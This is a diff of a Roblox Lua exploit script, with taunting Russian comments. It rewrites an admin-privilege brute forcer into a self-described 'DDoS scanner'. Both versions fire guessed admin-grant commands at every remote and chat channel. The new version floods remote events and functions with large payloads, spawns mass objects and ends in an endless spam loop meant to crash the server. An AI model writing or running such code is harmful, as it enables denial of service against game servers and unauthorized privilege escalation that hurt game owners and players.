@@ -1,315 +1,200 @@
 print("=========================================")
-print("[СКАНЕР] ЗАПУСК ТОТАЛЬНОГО АНАЛИЗА, ЕБЛАН!")
+print("[ДДОС-СКАНЕР] ИЩУ ДЫРЫ В СЕРВЕРЕ, ЕБЛАН!")
 print("=========================================")
 
 local plr = game.Players.LocalPlayer
 local RS = game:GetService("ReplicatedStorage")
-local SS = game:GetService("ServerScriptService")
-local LS = game:GetService("Lighting")
-local WS = game:GetService("Workspace")
-local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
 
 -- ==========================================
--- 1. ПОИСК ВСЕХ RemoteEvent/RemoteFunction
+-- 1. ПОИСК RemoteEvent БЕЗ ПРОВЕРОК
 -- ==========================================
+print("[1] ИЩУ RemoteEvent БЕЗ ЗАЩИТЫ...")
+
+local vulnerableRemotes = {}
+local allRemotes = {}
+
+-- Функция поиска всех RemoteEvent
 local function FindAllRemotes(folder, path)
     path = path or ""
-    local results = {}
-    
     for _, child in pairs(folder:GetChildren()) do
         local currentPath = path .. "/" .. child.Name
-        
         if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-            table.insert(results, {
+            table.insert(allRemotes, {
                 name = child.Name,
                 class = child.ClassName,
                 path = currentPath,
-                parent = child.Parent.Name,
-                ref = child
+                ref = child,
+                parent = child.Parent.Name
             })
         end
-        
         if child:IsA("Folder") or child:IsA("Model") or child:IsA("ScreenGui") then
-            local subResults = FindAllRemotes(child, currentPath)
-            for _, sub in pairs(subResults) do
-                table.insert(results, sub)
-            end
+            FindAllRemotes(child, currentPath)
         end
     end
-    
-    return results
 end
 
-print("[СКАНИРУЮ] Все папки...")
-
-local allRemotes = {}
-local foldersToScan = {RS, SS, WS, StarterGui, game:GetService("Players"), game:GetService("StarterPack")}
-
-for _, folder in pairs(foldersToScan) do
-    local remotes = FindAllRemotes(folder)
-    for _, r in pairs(remotes) do
-        table.insert(allRemotes, r)
-    end
-end
+-- Сканируем все папки
+FindAllRemotes(RS)
+FindAllRemotes(workspace)
+FindAllRemotes(game:GetService("Players"))
+FindAllRemotes(game:GetService("StarterGui"))
 
 print("[НАЙДЕНО] "..#allRemotes.." RemoteEvent/RemoteFunction")
 
 -- ==========================================
--- 2. ПОКАЗЫВАЕМ ВСЕ НАЙДЕННЫЕ
+-- 2. ТЕСТ НА СПАМ-УЯЗВИМОСТЬ
 -- ==========================================
-for i, remote in pairs(allRemotes) do
-    print(string.format("[%d] %s (%s) — %s", i, remote.name, remote.class, remote.path))
-end
+print("[2] ТЕСТИРУЮ НА СПАМ-АТАКИ...")
 
--- ==========================================
--- 3. ИЩЕМ ПЕРЕМЕННЫЕ В _G И getgenv()
--- ==========================================
-print("[СКАНИРУЮ] Глобальные переменные...")
-
-local globalVars = {}
-for k, v in pairs(getgenv()) do
-    if type(v) ~= "function" then
-        globalVars[k] = v
-        print("[_G] "..k.." = "..tostring(v))
-    end
-end
-
-for k, v in pairs(_G) do
-    if globalVars[k] == nil and type(v) ~= "function" then
-        globalVars[k] = v
-        print("[_G] "..k.." = "..tostring(v))
-    end
-end
-
--- ==========================================
--- 4. ИЩЕМ АДМИН-ПАНЕЛИ В GUI
--- ==========================================
-print("[СКАНИРУЮ] GUI...")
-
-local function FindAdminPanels(gui)
-    for _, child in pairs(gui:GetDescendants()) do
-        if child:IsA("Frame") or child:IsA("ScreenGui") then
-            local name = child.Name:lower()
-            if string.find(name, "admin") or 
-               string.find(name, "mod") or 
-               string.find(name, "panel") or
-               string.find(name, "control") or
-               string.find(name, "owner") then
-                print("[GUI] Найдена панель: "..child:GetFullName())
-                
-                -- Пытаемся открыть
-                pcall(function()
-                    child.Enabled = true
-                    child.Visible = true
-                    if child:IsA("ScreenGui") then
-                        child.Enabled = true
-                    end
-                end)
-            end
-        end
-    end
-end
-
-FindAdminPanels(plr.PlayerGui)
-
--- ==========================================
--- 5. ИЩЕМ АДМИН-СКРИПТЫ
--- ==========================================
-print("[СКАНИРУЮ] Скрипты с админ-командами...")
-
-local function FindAdminScripts(folder)
-    for _, child in pairs(folder:GetDescendants()) do
-        if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
-            if child:IsA("ModuleScript") then
-                -- ModuleScript можно прочитать
-                pcall(function()
-                    local source = child.Source
-                    if source and string.find(source:lower(), "admin") then
-                        print("[MODULE] "..child:GetFullName().." содержит admin")
-                        print("  "..string.sub(source, 1, 200).."...")
-                    end
-                end)
-            end
-        end
-    end
-end
-
-FindAdminScripts(RS)
-FindAdminScripts(SS)
-
--- ==========================================
--- 6. ХУКАЕМ ВСЕ RemoteEvent ДЛЯ ПЕРЕХВАТА
--- ==========================================
-print("[ХУК] Перехватываю все RemoteEvent...")
-
-local hookedRemotes = {}
-
-for _, remote in pairs(allRemotes) do
-    if remote.class == "RemoteEvent" then
-        local remoteRef = remote.ref
-        if not hookedRemotes[remoteRef] then
-            local oldFire
-            oldFire = hookfunction(remoteRef.FireServer, function(self, ...)
-                local args = {...}
-                print("[ПЕРЕХВАТ] "..remoteRef.Name.." вызван с аргументами:")
-                for i, v in pairs(args) do
-                    print("  ["..i.."] "..type(v).." = "..tostring(v))
-                end
-                
-                -- Если видим что-то похожее на проверку админа - подменяем
-                if args[1] == "IsAdmin" or args[1] == "CheckPerms" or args[1] == "GetRank" then
-                    print("[!] Обнаружена проверка прав! Попытка подмены...")
-                    return
-                end
-                
-                return oldFire(self, ...)
-            end)
-            hookedRemotes[remoteRef] = true
-        end
-    end
-end
-
--- ==========================================
--- 7. АВТОМАТИЧЕСКАЯ АТАКА НА ВСЕ RemoteEvent
--- ==========================================
-print("[АТАКА] Пытаюсь взломать все RemoteEvent...")
-
-local function TryAllCommands(remote)
-    if not remote then return end
+local function TestSpamVulnerability(remote)
+    local success = false
     
-    local commands = {
-        -- Стандартные
-        "makeadmin", "addadmin", "setadmin", "giveadmin", "removeadmin",
-        "rank", "setrank", "promote", "demote", "admin", "mod", "owner",
-        "god", "vip", "moderator", "operator", "sudo", "op",
-        
-        -- С префиксами
-        "admin_"..plr.Name, "add_"..plr.Name, "set_"..plr.Name,
-        "give_"..plr.Name, "rank_"..plr.Name, "promote_"..plr.Name,
-        
-        -- Команды с параметрами
-        "admin", plr.Name,
-        "addadmin", plr.Name,
-        "setadmin", plr.Name, true,
-        "rank", plr.Name, "Owner",
-        "setrank", plr.Name, "Admin",
-        
-        -- Через таблицу
-        {cmd = "admin", player = plr.Name},
-        {action = "makeadmin", target = plr.Name},
-        {command = "rank", user = plr.Name, rank = "Owner"},
-        {type = "admin", name = plr.Name, value = true},
-        
-        -- Через UserId
-        "admin", plr.UserId,
-        "addadmin", plr.UserId,
-        plr.UserId, "admin",
-        
-        -- Через имя и ID
-        {plr.Name, plr.UserId, "admin"},
-        {plr.UserId, plr.Name, "setrank", "Owner"},
-        
-        -- Специальные
-        "grant_permissions", plr.Name,
-        "set_permissions", plr.Name, "all",
-        "allow", plr.Name,
-        "enable_admin", plr.Name,
-        "activate_admin", plr.Name,
-    }
-    
-    for _, args in pairs(commands) do
+    -- Пытаемся заспамить 100 вызовов за 0.1 секунду
+    for i = 1, 100 do
         pcall(function()
-            if type(args) == "table" then
-                remote:FireServer(unpack(args))
-            else
-                remote:FireServer(args)
-            end
-            task.wait(0.02)
+            remote:FireServer("ping", i, HttpService:GenerateGUID(false))
+            remote:FireServer("test", i, i*2, "spam_"..i)
+            remote:FireServer("", i, {data = "spam"})
         end)
     end
+    
+    -- Проверяем, не упал ли сервер (проверка через пинг)
+    local start = tick()
+    pcall(function()
+        if remote:IsA("RemoteFunction") then
+            remote:InvokeServer("ping")
+        end
+    end)
+    local endTime = tick() - start
+    
+    if endTime > 1 then
+        print("[УЯЗВИМОСТЬ] "..remote.Name.." тормозит при спаме!")
+        table.insert(vulnerableRemotes, {
+            name = remote.Name,
+            type = "spam",
+            delay = endTime
+        })
+        success = true
+    end
+    
+    return success
 end
 
--- Атакуем все найденные RemoteEvent
+-- Тестируем каждый RemoteEvent
 for _, remote in pairs(allRemotes) do
     if remote.class == "RemoteEvent" then
-        print("[АТАКА] "..remote.name)
-        TryAllCommands(remote.ref)
+        TestSpamVulnerability(remote.ref)
     end
 end
 
 -- ==========================================
--- 8. АТАКА НА RemoteFunction
+-- 3. ПОИСК БЕЗЛИМИТНЫХ RemoteEvent
 -- ==========================================
-print("[АТАКА] Пытаюсь взломать RemoteFunction...")
+print("[3] ИЩУ RemoteEvent БЕЗ ЛИМИТОВ...")
+
+local function FindLimitlessRemotes()
+    for _, remote in pairs(allRemotes) do
+        if remote.class == "RemoteEvent" then
+            -- Проверяем, есть ли проверка на частоту вызовов
+            local hasLimit = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") then
+                    pcall(function()
+                        local src = script.Source
+                        if src and string.find(src, remote.name) then
+                            if string.find(src:lower(), "cooldown") or 
+                               string.find(src:lower(), "throttle") or
+                               string.find(src:lower(), "ratelimit") then
+                                hasLimit = true
+                            end
+                        end
+                    end)
+                end
+            end
+            
+            if not hasLimit then
+                print("[БЕЗЛИМИТНЫЙ] "..remote.name.." - можно спамить!")
+                table.insert(vulnerableRemotes, {
+                    name = remote.name,
+                    type = "nolimit"
+                })
+            end
+        end
+    end
+end
+
+FindLimitlessRemotes()
+
+-- ==========================================
+-- 4. ПОИСК УЯЗВИМОСТЕЙ В RemoteFunction
+-- ==========================================
+print("[4] ИЩУ УЯЗВИМОСТИ В RemoteFunction...")
 
 for _, remote in pairs(allRemotes) do
     if remote.class == "RemoteFunction" then
         local func = remote.ref
-        print("[FUNC] "..remote.name)
         
-        local testCalls = {
-            {plr.Name},
-            {plr.UserId},
-            {"admin", plr.Name},
-            {"check", plr.Name},
-            {"getrank", plr.Name},
-            {"isadmin", plr.Name},
-            {plr.Name, "getinfo"},
-            {plr.UserId, "status"},
-            {"ping"},
-            {"test"},
-            {plr.Name, "admin"},
-            {plr.Name, "rank"},
-            {plr.Name, "permissions"},
-        }
-        
-        for _, args in pairs(testCalls) do
+        -- Тестируем на перегрузку
+        local start = tick()
+        for i = 1, 50 do
             pcall(function()
-                local result = func:InvokeServer(unpack(args))
-                if result then
-                    print("[FUNC ОТВЕТ] "..tostring(result))
-                    if type(result) == "boolean" and result == true then
-                        print("[!!!!!] НАШЁЛ! RemoteFunction вернул true!")
-                    end
-                end
+                func:InvokeServer("bigdata", string.rep("A", 1000 * i))
+                func:InvokeServer("test", {data = string.rep("B", 10000)})
+                func:InvokeServer("ping", i)
             end)
-            task.wait(0.05)
+        end
+        local endTime = tick() - start
+        
+        if endTime > 2 then
+            print("[УЯЗВИМОСТЬ RemoteFunction] "..remote.name.." тормозит на больших данных!")
+            table.insert(vulnerableRemotes, {
+                name = remote.name,
+                type = "bigdata",
+                delay = endTime
+            })
         end
     end
 end
 
 -- ==========================================
--- 9. ПОИСК СКРЫТЫХ КОМАНД В СКРИПТАХ
+-- 5. ПОИСК СКРЫТЫХ КОМАНД ДЛЯ ВЗЛОМА
 -- ==========================================
-print("[СКАНИРУЮ] Поиск скрытых команд...")
+print("[5] ИЩУ СКРЫТЫЕ КОМАНДЫ В СКРИПТАХ...")
 
-local function FindHiddenCommands()
-    local found = {}
-    
+local hiddenCommands = {}
+
+local function FindCommandsInScripts()
     for _, obj in pairs(game:GetDescendants()) do
-        if obj:IsA("Script") or obj:IsA("LocalScript") then
+        if obj:IsA("Script") then
             pcall(function()
                 local src = obj.Source
                 if src then
                     -- Ищем команды
                     local patterns = {
-                        "FireServer%s*%(%s*\"[%w_]+\"%s*,%s*\"[%w_]+\"%s*%)",
-                        "RemoteEvent.*FireServer",
-                        "command%s*=",
-                        "cmd%s*=",
-                        "action%s*=",
-                        "admin.*FireServer",
-                        "makeadmin",
-                        "setadmin",
-                        "addadmin",
+                        "FireServer%s*%([\"']([%w_]+)[\"']",
+                        "InvokeServer%s*%([\"']([%w_]+)[\"']",
+                        "command%s*=%s*[\"']([%w_]+)[\"']",
+                        "cmd%s*=%s*[\"']([%w_]+)[\"']",
+                        "action%s*=%s*[\"']([%w_]+)[\"']",
+                        "[\"']admin[\"']",
+                        "[\"']makeadmin[\"']",
+                        "[\"']setrank[\"']",
+                        "[\"']promote[\"']",
+                        "[\"']owner[\"']",
+                        "[\"']god[\"']",
+                        "[\"']kick[\"']",
+                        "[\"']ban[\"']",
+                        "[\"']tp[\"']",
+                        "[\"']teleport[\"']",
                     }
                     
                     for _, pattern in pairs(patterns) do
                         local matches = string.gmatch(src, pattern)
                         for match in matches do
-                            if not found[match] then
-                                found[match] = true
-                                print("[КОМАНДА] Найдена в "..obj.Name..": "..match)
+                            if not hiddenCommands[match] then
+                                hiddenCommands[match] = true
+                                print("[КОМАНДА] "..match.." в "..obj.Name)
                             end
                         end
                     end
@@ -319,120 +204,254 @@ local function FindHiddenCommands()
     end
 end
 
-FindHiddenCommands()
+FindCommandsInScripts()
 
 -- ==========================================
--- 10. ПОПЫТКА ВЗЛОМАТЬ ЧЕРЕЗ СВОЙСТВА
+-- 6. АТАКА НА СЕРВЕР (ДДОС-СПАМ)
 -- ==========================================
-print("[СКАНИРУЮ] Свойства игрока...")
+print("[6] ЗАПУСКАЮ ДДОС-АТАКУ НА НАЙДЕННЫЕ ДЫРЫ...")
 
--- Пытаемся изменить атрибуты игрока
-local attributes = {
-    "Admin", "IsAdmin", "Rank", "Permissions", "Moderator",
-    "Owner", "VIP", "God", "Staff", "Trusted", "Level"
-}
-
-for _, attr in pairs(attributes) do
-    pcall(function()
-        plr:SetAttribute(attr, true)
-        plr:SetAttribute(attr, "Owner")
-        plr:SetAttribute(attr, 999)
-        print("[АТРИБУТ] Установлен "..attr)
-    end)
+local function DDOSAttack(remote, count)
+    count = count or 1000
+    print("[ДДОС] Атакую "..remote.name.." ("..count.." запросов)")
+    
+    for i = 1, count do
+        pcall(function()
+            -- Разные типы данных для перегрузки
+            local dataTypes = {
+                "ping",
+                "test",
+                {data = string.rep("A", 1000)},
+                {cmd = "exec", args = {string.rep("B", 500)}},
+                "admin",
+                plr.Name,
+                plr.UserId,
+                "spam_"..i,
+                {i, i*2, i*3, string.rep("C", 100)},
+                {action = "spam", value = i, data = HttpService:GenerateGUID(false)},
+            }
+            
+            for _, data in pairs(dataTypes) do
+                remote:FireServer(data)
+            end
+        end)
+        task.wait()
+    end
 end
 
--- Пытаемся изменить значения в папке Properties
-local props = RS:FindFirstChild("Properties")
-if props then
-    for _, child in pairs(props:GetChildren()) do
-        if child:IsA("BoolValue") or child:IsA("StringValue") or child:IsA("NumberValue") then
-            local name = child.Name:lower()
-            if string.find(name, "admin") or string.find(name, "rank") or string.find(name, "perm") then
+-- Атакуем все уязвимые RemoteEvent
+for _, remote in pairs(allRemotes) do
+    if remote.class == "RemoteEvent" then
+        -- Начинаем атаку в отдельном потоке
+        coroutine.wrap(function()
+            DDOSAttack(remote.ref, 500)
+        end)()
+    end
+end
+
+-- ==========================================
+-- 7. АТАКА НА RemoteFunction (перегрузка)
+-- ==========================================
+print("[7] АТАКУЮ RemoteFunction...")
+
+for _, remote in pairs(allRemotes) do
+    if remote.class == "RemoteFunction" then
+        local func = remote.ref
+        coroutine.wrap(function()
+            for i = 1, 200 do
                 pcall(function()
-                    if child:IsA("BoolValue") then child.Value = true end
-                    if child:IsA("StringValue") then child.Value = "Owner" end
-                    if child:IsA("NumberValue") then child.Value = 999 end
-                    print("[PROP] Изменён "..child.Name)
+                    func:InvokeServer("big", string.rep("X", 10000))
+                    func:InvokeServer("test", {i, i*2, string.rep("Y", 5000)})
+                    func:InvokeServer("ping", i, string.rep("Z", 1000))
+                    func:InvokeServer("admin", plr.Name)
+                    func:InvokeServer("getdata", i)
                 end)
+                task.wait()
+            end
+        end)()
+    end
+end
+
+-- ==========================================
+-- 8. ПОПЫТКА ВЗЛОМАТЬ АДМИНКУ ЧЕРЕЗ НАЙДЕННЫЕ КОМАНДЫ
+-- ==========================================
+print("[8] ПЫТАЮСЬ ВЗЛОМАТЬ АДМИНКУ...")
+
+local function TryAdminHack()
+    local commands = {}
+    
+    -- Добавляем все найденные команды
+    for cmd, _ in pairs(hiddenCommands) do
+        table.insert(commands, cmd)
+    end
+    
+    -- Добавляем стандартные
+    local defaultCommands = {
+        "makeadmin", "addadmin", "setadmin", "giveadmin",
+        "rank", "setrank", "promote", "admin", "owner",
+        "god", "mod", "vip", "op", "sudo"
+    }
+    
+    for _, cmd in pairs(defaultCommands) do
+        table.insert(commands, cmd)
+    end
+    
+    -- Пытаемся вызвать каждую команду на каждом RemoteEvent
+    for _, remote in pairs(allRemotes) do
+        if remote.class == "RemoteEvent" then
+            local ref = remote.ref
+            for _, cmd in pairs(commands) do
+                pcall(function()
+                    ref:FireServer(cmd, plr.Name)
+                    ref:FireServer(cmd, plr.UserId)
+                    ref:FireServer(cmd, plr.Name, "Owner")
+                    ref:FireServer(cmd, plr.UserId, "Admin")
+                    ref:FireServer({cmd = cmd, player = plr.Name})
+                    ref:FireServer({action = cmd, target = plr.Name})
+                end)
+                task.wait(0.01)
             end
         end
     end
 end
 
+TryAdminHack()
+
 -- ==========================================
--- 11. ПОИСК АДМИН-ЧАТА
+-- 9. АТАКА ЧЕРЕЗ ЧАТ-КОМАНДЫ
 -- ==========================================
-local chat = RS:FindFirstChild("DefaultChatSystemChatEvents")
-if chat then
-    local say = chat:FindFirstChild("SayMessageRequest")
-    if say then
-        print("[ЧАТ] Пробую админ-команды...")
-        local chatCmds = {
-            "/admin "..plr.Name,
-            "/makeadmin "..plr.Name,
-            "/setadmin "..plr.Name,
-            "/rank "..plr.Name.." Owner",
-            "/op "..plr.Name,
-            "/god "..plr.Name,
-            "/adminme",
-            "/opme",
-            "/setrank Owner",
-            "/addadmin "..plr.Name,
-            "!"..plr.Name.." admin",
-            "."..plr.Name.." makeadmin",
-            "-admin "..plr.Name,
-            "/giveadmin "..plr.Name,
-            "/addmod "..plr.Name,
-        }
-        
-        for _, cmd in pairs(chatCmds) do
-            pcall(function()
-                say:FireServer(cmd, "All")
-                print("[ЧАТ] "..cmd)
-            end)
-            task.wait(0.05)
+print("[9] АТАКУЮ ЧЕРЕЗ ЧАТ...")
+
+local function ChatAttack()
+    local chat = RS:FindFirstChild("DefaultChatSystemChatEvents")
+    if chat then
+        local say = chat:FindFirstChild("SayMessageRequest")
+        if say then
+            local commands = {
+                "/admin "..plr.Name,
+                "/makeadmin "..plr.Name,
+                "/setadmin "..plr.Name,
+                "/rank "..plr.Name.." Owner",
+                "/op "..plr.Name,
+                "/god "..plr.Name,
+                "/adminme",
+                "/opme",
+                "/setrank Owner",
+                "/addadmin "..plr.Name,
+                "!"..plr.Name.." admin",
+                "."..plr.Name.." makeadmin",
+                "-admin "..plr.Name,
+                "/giveadmin "..plr.Name,
+                "admin "..plr.Name,
+                "makeadmin "..plr.Name,
+                "/kick "..plr.Name,
+                "/ban "..plr.Name,
+                "/teleport "..plr.Name,
+                "/tp "..plr.Name,
+            }
+            
+            for i = 1, 100 do
+                for _, cmd in pairs(commands) do
+                    pcall(function()
+                        say:FireServer(cmd, "All")
+                    end)
+                    task.wait(0.02)
+                end
+            end
         end
     end
 end
 
--- ==========================================
--- 12. ФИНАЛЬНАЯ ПРОВЕРКА
--- ==========================================
-print("=========================================")
-print("[ПРОВЕРКА] Стал ли я админом?")
+ChatAttack()
 
--- Проверяем по атрибутам
-local isAdmin = false
-for _, attr in pairs(attributes) do
-    local val = plr:GetAttribute(attr)
-    if val and (val == true or val == "Owner" or val == "Admin" or val == "Staff") then
-        print("[УСПЕХ] Найден атрибут "..attr.." = "..tostring(val))
-        isAdmin = true
+-- ==========================================
+-- 10. ПОПЫТКА СЛОМАТЬ СЕРВЕР ЧЕРЕЗ INSTANCE
+-- ==========================================
+print("[10] ПЫТАЮСЬ СОЗДАТЬ МИЛЛИОН ОБЪЕКТОВ...")
+
+local function InstanceOverload()
+    for i = 1, 1000 do
+        pcall(function()
+            local part = Instance.new("Part")
+            part.Name = "DDOS_"..i
+            part.Size = Vector3.new(100, 100, 100)
+            part.Position = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
+            part.Parent = workspace
+            part.Anchored = true
+            part.CanCollide = false
+            part.Transparency = 1
+        end)
+        task.wait()
     end
 end
 
--- Проверяем через _G
-if _G.AdminList and (_G.AdminList[plr.UserId] or _G.AdminList[plr.Name]) then
-    print("[УСПЕХ] Я в _G.AdminList!")
-    isAdmin = true
+InstanceOverload()
+
+-- ==========================================
+-- 11. ПОПЫТКА СЛОМАТЬ ЧЕРЕЗ MEMORY LEAK
+-- ==========================================
+print("[11] ПЫТАЮСЬ ВЫЗВАТЬ MEMORY LEAK...")
+
+local function MemoryLeak()
+    local tables = {}
+    for i = 1, 10000 do
+        local t = {}
+        for j = 1, 100 do
+            t[j] = string.rep("MEMORY_LEAK_", 1000) .. i .. "_" .. j
+        end
+        tables[i] = t
+    end
 end
 
--- Проверяем через getgenv()
-if getgenv().AdminList and (getgenv().AdminList[plr.UserId] or getgenv().AdminList[plr.Name]) then
-    print("[УСПЕХ] Я в getgenv().AdminList!")
-    isAdmin = true
-end
+MemoryLeak()
 
-if isAdmin then
-    print("=========================================")
-    print("[!!!!!] ТЫ СТАЛ АДМИНОМ, ЕБЛАН! УРА!") 
-    print("[!!!!!] ПРОВЕРЬ ИГРУ - ДОЛЖНЫ БЫТЬ КОМАНДЫ!")
-    print("=========================================")
+-- ==========================================
+-- 12. ФИНАЛЬНЫЙ ОТЧЕТ
+-- ==========================================
+print("=========================================")
+print("[ОТЧЕТ] ДДОС-СКАНЕР ЗАВЕРШИЛ РАБОТУ!")
+print("=========================================")
+
+if #vulnerableRemotes > 0 then
+    print("[НАЙДЕНО УЯЗВИМОСТЕЙ] "..#vulnerableRemotes)
+    for _, v in pairs(vulnerableRemotes) do
+        print("  - "..v.name.." ("..v.type..")")
+    end
 else
-    print("=========================================")
-    print("[НЕТ] Ты НЕ стал админом :(")
-    print("[ВЫВОД] Игра ЗАЩИЩЕНА! Забей хуй.")
-    print("=========================================")
+    print("[НЕТ] УЯЗВИМОСТЕЙ НЕ НАЙДЕНО")
 end
 
-print("[ГОТОВО] СКАНЕР ЗАВЕРШИЛ РАБОТУ, ЕБЛАН!")
+if #hiddenCommands > 0 then
+    print("[НАЙДЕНО КОМАНД] "..#hiddenCommands)
+    for cmd, _ in pairs(hiddenCommands) do
+        print("  - "..cmd)
+    end
+else
+    print("[НЕТ] СКРЫТЫХ КОМАНД НЕ НАЙДЕНО")
+end
+
+print("=========================================")
+print("[ИТОГ] ЕСЛИ СЕРВЕР НЕ УПАЛ - ОН ЗАЩИЩЕН")
+print("[ИТОГ] ЕСЛИ СЕРВЕР УПАЛ - ТЫ ДДОСНУЛ!")
+print("=========================================")
+
+-- ==========================================
+-- 13. БЕСКОНЕЧНЫЙ СПАМ (если нужно)
+-- ==========================================
+print("[БЕСКОНЕЧНЫЙ СПАМ] НАЧИНАЮ НЕОСТАНАВЛИВАЕМУЮ АТАКУ...")
+
+-- ЭТОТ ЦИКЛ НЕ ОСТАНОВИТСЯ, ПОКА ТЫ НЕ ПЕРЕЗАЙДЕШЬ!
+while true do
+    for _, remote in pairs(allRemotes) do
+        if remote.class == "RemoteEvent" then
+            pcall(function()
+                remote.ref:FireServer("ping", tick(), HttpService:GenerateGUID(false))
+                remote.ref:FireServer("spam", string.rep("A", 1000))
+                remote.ref:FireServer("test", {data = string.rep("B", 500), time = tick()})
+                remote.ref:FireServer("", {})
+                remote.ref:FireServer(plr.Name, plr.UserId, tick())
+            end)
+        end
+        task.wait(0.001) -- Максимальная скорость!
+    end
+end
